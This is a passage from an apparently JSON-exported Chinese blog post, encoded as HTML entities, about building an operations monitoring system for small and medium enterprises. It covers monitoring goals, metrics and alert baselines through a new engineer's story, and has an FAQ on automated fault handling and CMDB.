C;&#x4E1A;&#x52A1;&#x662F;&#x591A;&#x53D8;&#x7684;&#xFF0C;&#x5982;&#x4F55;&#x8BA9;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x9002;&#x5E94;&#x591A;&#x53D8;&#x7684;&#x4E1A;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x8270;&#x5DE8;&#x7684;&#x4EFB;&#x52A1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/12.png\" alt=\"&#x56FE;&#x7247;12\"></p>\n<h2 id=\"&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\"><a href=\"#&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\" class=\"headerlink\" title=\"&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;\"></a>&#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;</h2><p>&#x8BE5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x65E0;&#x8BBA;&#x600E;&#x4E48;&#x52AA;&#x529B;&#x589E;&#x52A0;&#xFF0C;&#x8FD8;&#x662F;&#x89C9;&#x5F97;&#x603B;&#x6709;&#x6F0F;&#x4E0B;&#x7684;&#x3002;</p>\n<p>&#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#x8FD8;&#x6709;&#x548C;&#x8FD0;&#x7EF4;&#x76F8;&#x5173;&#x7684;&#x9875;&#x9762;&#x6027;&#x80FD;&#x76D1;&#x63A7;&#xFF08;&#x9875;&#x9762;&#x8D44;&#x6E90;&#x6570;&#x91CF;&#x3001;DNS&#x89E3;&#x6790;&#x65F6;&#x95F4;&#x3001;&#x9996;&#x5C4F;&#x65F6;&#x95F4;&#x3001;&#x52A0;&#x8F7D;&#x6700;&#x6162;&#x7684;&#x8D44;&#x6E90;&#x3001;&#x4EA7;&#x751F;&#x963B;&#x585E;&#x7684;JS&#x7B49;&#xFF09;&#x3001;&#x4EE3;&#x7801;&#x76D1;&#x63A7;&#x3001;&#x4E0E;&#x8FD0;&#x7EF4;&#x65E0;&#x5173;&#x7684;&#x8206;&#x8BBA;&#x76D1;&#x63A7;&#x7B49;&#xFF0C;&#x5148;&#x8FD9;&#x4E48;&#x591A;&#x5427;&#xFF01;</p>\n<p>&#x597D;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x662F;&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;&#x5F15;&#x5165;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4ECE;&#x9762;&#x8BD5;&#x7ED3;&#x675F;&#x5427;&#xFF01;&#x4E0B;&#x6B21;&#x518D;&#x9047;&#x5230;&#x7C7B;&#x4F3C;&#x7684;&#x9762;&#x8BD5;&#x9898;&#xFF0C;&#x6211;&#x76F8;&#x4FE1;&#x8BFB;&#x8005;&#x5FC3;&#x91CC;&#x4E00;&#x5B9A;&#x6709;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x7B54;&#x6848;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x5728;&#x8BE6;&#x8FF0;&#xFF0C;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5728;&#x4F60;&#x8111;&#x6D77;&#x4E2D;&#x5F62;&#x6210;&#x4E86;&#x5462;&#xFF1F;</p>\n<blockquote>\n<p>&#x5C0F;&#x8D34;&#x58EB;&#xFF1A;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x6709;&#x5F88;&#x5F3A;&#x7684;&#x8D23;&#x4EFB;&#x5FC3;&#xFF0C;&#x8FDE;&#x6D17;&#x6FA1;&#x90FD;&#x8981;&#x5E26;&#x4E0A;&#x624B;&#x673A;&#xFF0C;&#x4EE5;&#x514D;&#x9519;&#x8FC7;&#x62A5;&#x8B66;&#x7684;&#x4EBA;&#xFF0C;&#x4E0D;&#x8981;&#x72B9;&#x8C6B;&#xFF0C;&#x5148;&#x62DB;&#x8FDB;&#x6765;&#x518D;&#x6162;&#x6162;&#x57F9;&#x517B;&#x5427;&#x3002;&#x8D23;&#x4EFB;&#x5FC3;&#x662F;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x7684;&#x7B2C;&#x4E00;&#x8981;&#x7D20;&#xFF01;</p>\n</blockquote>\n<p>&#x540E;&#x8BB0;&#xFF1A;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x76EE;&#x524D;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x5173;&#x7CFB;&#x6811;&#x953B;&#x70BC;&#x7684;&#x8FDE;&#x738B;&#x83F2;&#x3001;&#x674E;&#x4E9A;&#x9E4F;&#x7684;&#x5173;&#x7CFB;&#x90FD;&#x80FD;&#x641E;&#x660E;&#x767D;&#x4E86;&#x3002;&#x53EF;&#x662F;&#x4F60;&#x5462;&#xFF1F;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x52A8;&#x624B;&#x5E72;&#x5427;&#xFF0C;&#x76D1;&#x63A7;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x65AD;&#x5B8C;&#x5584;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x8FD0;&#x7EF4;&#xFF08;&#x8FD0;&#x8425;&#xFF09;&#x548C;&#x9879;&#x76EE;&#x7684;&#x672C;&#x8D28;&#x533A;&#x522B;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;Devops&#xFF0C;&#x90A3;&#x4E48;&#x5F00;&#x59CB;&#x7F16;&#x7A0B;&#x5427;&#xFF01;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8001;&#x677F;&#xFF0C;&#x7ED9;&#x516C;&#x53F8;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x4E00;&#x4E2A;&#x8F6C;&#x53D8;&#x7684;&#x673A;&#x4F1A;&#x548C;&#x4E00;&#x4E9B;&#x65F6;&#x95F4;&#xFF0C;&#x4EBA;&#x603B;&#x662F;&#x4E0D;&#x65AD;&#x8FDB;&#x6B65;&#x7684;&#xFF01;</p>\n<h2 id=\"FAQ&#xFF1A;\"><a href=\"#FAQ&#xFF1A;\" class=\"headerlink\" title=\"FAQ&#xFF1A;\"></a>FAQ&#xFF1A;</h2><h3 id=\"&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\"><a href=\"#&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\" class=\"headerlink\" title=\"&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\"></a>&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;</h3><p>&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x5F62;&#x6001;&#x3001;&#x4E0D;&#x540C;&#x67B6;&#x6784;&#x3001;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x91C7;&#x7528;&#x7684;&#x65B9;&#x5F0F;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x4E1C;&#x897F;&#x5206;&#x4EAB;&#x3002;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E4B;&#x524D;&#x817E;&#x8BAF;&#x84DD;&#x9CB8;&#x7684;&#x5206;&#x4EAB;&#xFF0C;&#x4ED6;&#x4EEC;&#x5B9E;&#x73B0;&#x4E86;&#x6545;&#x969C;&#x81EA;&#x6108;&#x7684;&#x529F;&#x80FD;&#x3002;</p>\n<h3 id=\"&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\"><a href=\"#&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\" class=\"headerlink\" title=\"&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\"></a>&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;</h3><p>&#x6211;&#x4E2A;&#x4EBA;&#x7684;&#x89C2;&#x70B9;&#x662F;&#x61C2;&#x4E1A;&#x52A1;&#x80FD;&#x8BA9;&#x8FD0;&#x7EF4;&#x8D70;&#x7684;&#x66F4;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x8C61;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5176;&#x5B83;&#x90E8;&#x95E8;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x662F;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x5462;&#xFF1F;</p>\n<p>&#x53EF;&#x4EE5;&#x7AD9;&#x5728;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x7684;&#x89C6;&#x89D2;&#x6765;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BBF;&#x95EE;&#x6162;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6162;&#xFF0C;&#x662F;&#x67B6;&#x6784;&#x7684;&#x539F;&#x56E0;&#xFF0C;Nginx&#x914D;&#x7F6E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x539F;&#x56E0;&#x3002;</p>\n<p>&#x4E0D;&#x8981;&#x7B49;&#x7740;&#x9886;&#x5BFC;&#x6765;&#x5B89;&#x6392;&#xFF0C;&#x8FD0;&#x7EF4;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x662F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x81EA;&#x5DF1;&#x505A;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x601D;&#x60F3;&#x6709;&#x591A;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x5C31;&#x80FD;&#x8D70;&#x591A;&#x8FDC;&#xFF01;</p>\n<p>&#x90A3;&#x4E48;&#x76D1;&#x63A7;&#x5728;&#x8FD9;&#x91CC;&#x53D1;&#x6325;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#xFF1A;&#x8BA9;&#x6570;&#x636E;&#x8BF4;&#x8BDD;&#xFF01;</p>\n<h3 id=\"&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\"><a href=\"#&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\" class=\"headerlink\" title=\"&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\"></a>&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;</h3><p>&#x6211;&#x8BA4;&#x4E3A;CMDB&#x662F;&#x57FA;&#x7840;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x5730;&#x65B9;&#x80FD;&#x51C6;&#x786E;&#x7684;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x3001;&#x914D;&#x7F6E;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8D2D;&#x4E70;&#x7684;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8FC7;&#x4FDD;&#xFF1F;&#x90FD;&#x8FD0;&#x884C;&#x4E86;&#x54EA;&#x4E9B;&#x670D;&#x52A1;&#x3001;&#x5F00;&#x653E;&#x4E86;&#x4EC0;&#x4E48;&#x7AEF;&#x53E3;&#x3001;&#x7248;&#x672C;&#x662F;&#x4EC0;&#x4E48;&#xFF08;&#x5347;&#x7EA7;&#x65F6;&#x4F7F;&#x7528;&#xFF09;&#x3002;</p>\n<p>&#x6709;&#x4E86;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x548C;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3001;&#x90E8;&#x7F72;&#x7CFB;&#x7EDF;&#x3001;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x6709;&#x6548;&#x7684;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x603B;&#x7ED3;&#x8D77;&#x6765;&#x5C31;&#x662F;&#xFF1A;&#x4EE5;&#x4E1A;&#x52A1;&#x4E3A;&#x5BFC;&#x5411;&#x3001;&#x4EE5;CMDB&#x4E3A;&#x4E2D;&#x5FC3;&#x3001;&#x4EE5;API&#x4E3A;&#x57FA;&#x7840;&#x6765;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x7684;&#x5EFA;&#x8BBE;&#x3002;</p>\n<p>&#x6709;&#x4E86;CMDB&#x7684;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x90A3;&#x4E9B;&#x770B;&#x7740;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x81EA;&#x52A8;&#x7ED8;&#x51FA;&#x67B6;&#x6784;&#x56FE;&#x548C;&#x673A;&#x67DC;&#x56FE;&#x5C31;&#x4E0D;&#x662F;&#x96BE;&#x4E8B;&#x4E86;&#x3002;</p>\n","excerpt":"<blockquote>\n<p>&#x6587;&#x7AE0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;</p>\n</blockquote>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>","more":"<hr>\n<h2 id=\"&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\"><a href=\"#&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\"></a>&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;</h2><p>&#x8D75;&#x821C;&#x4E1C;&#xFF0C;&#x6C5F;&#x6E56;&#x4EBA;&#x79F0;&#x8D75;&#x73ED;&#x957F;&#xFF0C;&#x66FE;&#x5728;&#x6B66;&#x8B66;&#x67D0;&#x90E8;&#x8D1F;&#x8D23;&#x6307;&#x6325;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x67B6;&#x6784;&#x548C;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;2008&#x5E74;&#x9000;&#x5F79;&#x540E;&#x4E00;&#x76F4;&#x4ECE;&#x4E8B;&#x4E92;&#x8054;&#x7F51;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x3002;&#x66FE;&#x5E26;&#x56E2;&#x961F;&#x8D1F;&#x8D23;&#x56FD;&#x5185;&#x67D0;&#x98DF;&#x54C1;&#x7535;&#x5546;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;&#x5373;&#x5C06;&#x51FA;&#x7248;&#x7684;&#x300A;saltstack&#x5165;&#x95E8;&#x4E0E;&#x5B9E;&#x8DF5;&#x300B;&#x4F5C;&#x8005;&#x4E4B;&#x4E00;&#x3002;</p>\n<h2 id=\"&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\"><a href=\"#&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\"></a>&#x4E3B;&#x9898;&#x7B80;&#x4ECB;</h2><p>&#x6211;&#x4EEC;&#x4ECA;&#x5929;&#x7684;&#x8BDD;&#x9898;&#x662F;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x6784;&#x5EFA;&#x5B9E;&#x6218;&#x300B;&#xFF0C;&#x524D;&#x671F;&#x5206;&#x4EAB;&#x4E86;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x5B9E;&#x6218;&#x300B;&#x8FD8;&#x6CA1;&#x6709;&#x770B;&#x5230;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x5148;&#x9605;&#x8BFB;&#x4E0B;&#xFF0C;&#x8FD9;&#x6837;&#x4E5F;&#x80FD;&#x660E;&#x767D;&#x4E3A;&#x4F55;&#x8981;&#x5B9A;&#x4F4D;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x3002;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x8BDD;&#x9898;&#x5B9E;&#x5728;&#x592A;&#x5927;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x6B63;&#x786E;&#x5B9A;&#x4F4D;&#x5E94;&#x8BE5;&#x662F;&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;&#x201C;&#x76F8;&#x5BF9;&#x201D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x3002;</p>\n<h2 id=\"&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\"><a href=\"#&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\" class=\"headerlink\" title=\"&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\"></a>&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;</h2><p>&#x5728;&#x4E4B;&#x524D;&#x7684;&#x62DB;&#x8058;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x5FC5;&#x95EE;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x201C;<strong>&#x4F60;&#x4EEC;&#x4E4B;&#x524D;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x600E;&#x4E48;&#x505A;&#x7684;&#xFF1F;&#x4F60;&#x8BA4;&#x4E3A;&#x600E;&#x4E48;&#x505A;&#x6548;&#x679C;&#x6BD4;&#x8F83;&#x597D;&#xFF1F;</strong>&#x201D;</p>\n<p>&#x7ECF;&#x5E38;&#x5F97;&#x5230;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x7B54;&#x6848;&#xFF1A;&#x201C;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;&#x7684;Nagios&#x3001;Cacti&#x505A;&#x76D1;&#x63A7;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;Zabbix&#x505A;&#x76D1;&#x63A7;&#x201D;&#xFF0C;&#x518D;&#x7EE7;&#x7EED;&#x8FFD;&#x95EE;&#x5F80;&#x5F80;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x7684;&#x7EC6;&#x8282;&#x7684;&#x56DE;&#x7B54;&#x3002;</p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x56DE;&#x7B54;&#x56FA;&#x7136;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x5374;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x7ECF;&#x5E38;&#x4F1A;&#x88AB;&#x5DE5;&#x5177;&#x8FF7;&#x60D1;&#x53CC;&#x773C;&#xFF0C;&#x4ECE;&#x800C;&#x5FD8;&#x8BB0;&#x4E86;&#x6700;&#x521D;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x3002;&#x672C;&#x6587;&#x5C31;&#x4EE5;&#x4E00;&#x4E2A;&#x521A;&#x5165;&#x804C;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x6765;&#x9610;&#x8FF0;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x6545;&#x4E8B;&#x7684;&#x540D;&#x5B57;&#x53EB;&#x505A;&#x300A;&#x5C0F;&#x738B;&#x7279;&#x70E6;&#x607C;&#x300B;&#x3002;</p>\n<h3 id=\"1-&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\"><a href=\"#1-&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\" class=\"headerlink\" title=\"1. &#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\"></a>1. &#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;</h3><p>&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4EC0;&#x4E48;&#x662F;&#x76D1;&#x63A7;&#x548C;&#x76D1;&#x63A7;&#x7684;&#x91CD;&#x8981;&#x6027;&#x7B49;&#x5927;&#x6BB5;&#x63CF;&#x8FF0;&#xFF0C;&#x5148;&#x4ED4;&#x7EC6;&#x7684;&#x60F3;&#x4E00;&#x60F3;&#xFF0C;&#x76D1;&#x63A7;&#x7684;&#x76EE;&#x6807;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;</p>\n<p>&#x6BCF;&#x4E2A;&#x4EBA;&#x7684;&#x7B54;&#x6848;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x6211;&#x7684;&#x56DE;&#x7B54;&#x662F;&#xFF1A;&#x7EC8;&#x6781;&#x76EE;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E1A;&#x52A1;&#x7684;&#x6301;&#x7EED;&#x548C;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x3002;&#x5982;&#x6B64;&#x504F;&#x6FC0;&#x7684;&#x56DE;&#x7B54;&#x5C31;&#x662F;&#x8BA9;&#x8BFB;&#x8005;&#x4ECE;&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x8981;&#x7AD9;&#x5728;&#x4E1A;&#x52A1;&#x7684;&#x89D2;&#x5EA6;&#x7684;&#x5F00;&#x59CB;&#x89C4;&#x5212;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x67D0;&#x4E2A;&#x6280;&#x672F;&#x8303;&#x7574;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF1A;&#x672C;&#x6587;&#x4E0D;&#x6D89;&#x53CA;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;&#x6027;&#x80FD;&#x4F18;&#x5316;&#x4E2D;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x6240;&#x6709;&#x6587;&#x5B57;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x90FD;&#x662F;&#x65E5;&#x5E38;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x5728;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x5148;&#x7EDF;&#x4E00;&#x4E0B;&#x8BA4;&#x8BC6;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x9700;&#x8981;&#x638C;&#x63E1;&#x54EA;&#x4E9B;&#x4E1C;&#x897F;&#x5462;&#xFF1F;</p>\n<ul>\n<li><p>&#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x7406;&#x89E3;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5BF9;&#x8C61;&#x4F60;&#x662F;&#x5426;&#x4E86;&#x89E3;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x5230;&#x5E95;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#xFF1F;</p>\n</li>\n<li><p>&#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x6307;&#x6807;&#xFF1A;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7684;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x8D1F;&#x8F7D;&#x3001;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#x3002;</p>\n</li>\n<li><p>&#x786E;&#x5B9A;&#x62A5;&#x8B66;&#x57FA;&#x51C6;&#x7EBF;&#xFF1A;&#x600E;&#x4E48;&#x6837;&#x624D;&#x7B97;&#x662F;&#x6545;&#x969C;&#xFF0C;&#x8981;&#x62A5;&#x8B66;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;&#x8D1F;&#x8F7D;&#x5230;&#x5E95;&#x591A;&#x5C11;&#x7B97;&#x9AD8;&#xFF1F;</p>\n</li>\n</ul>\n<p>&#x5982;&#x679C;&#x4E0A;&#x8FF0;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x6EE1;&#x8DB3;&#xFF0C;&#x90A3;&#x5C31;&#x5148;&#x4E0D;&#x8981;&#x5F00;&#x59CB;&#x5B9E;&#x65BD;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x7B49;&#x505A;&#x5B8C;&#x4E86;&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x7136;&#x5E76;&#x5375;&#xFF1F;</p>\n<h3 id=\"2-&#x6545;&#x4E8B;&#x5F00;&#x59CB;\"><a href=\"#2-&#x6545;&#x4E8B;&#x5F00;&#x59CB;\" class=\"headerlink\" title=\"2. &#x6545;&#x4E8B;&#x5F00;&#x59CB;\"></a>2. &#x6545;&#x4E8B;&#x5F00;&#x59CB;</h3><p>&#x738B;&#x5C0F;&#x660E;&#xFF08;&#x5316;&#x540D;&#xFF09;&#x521A;&#x521A;&#x6BD5;&#x4E1A;&#xFF0C;&#x5230;&#x4E86;&#x4E00;&#x5BB6;&#x521A;&#x521A;&#x8D77;&#x6B65;&#x7684;&#x7535;&#x5546;&#x516C;&#x53F8;&#x4EFB;&#x804C;&#xFF1A;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x521A;&#x4E0A;&#x73ED;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x5C0F;&#x738B;&#x6536;&#x5230;&#x9886;&#x5BFC;&#x5B89;&#x6392;&#x7684;&#x5149;&#x8363;&#x4EFB;&#x52A1;:&#x628A;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x641E;&#x8D77;&#x6765;&#xFF01;</p>\n<p>&#x5C0F;&#x738B;&#x60F3;&#x4E86;&#x597D;&#x4E45;&#xFF0C;&#x6CA1;&#x60F3;&#x660E;&#x767D;&#xFF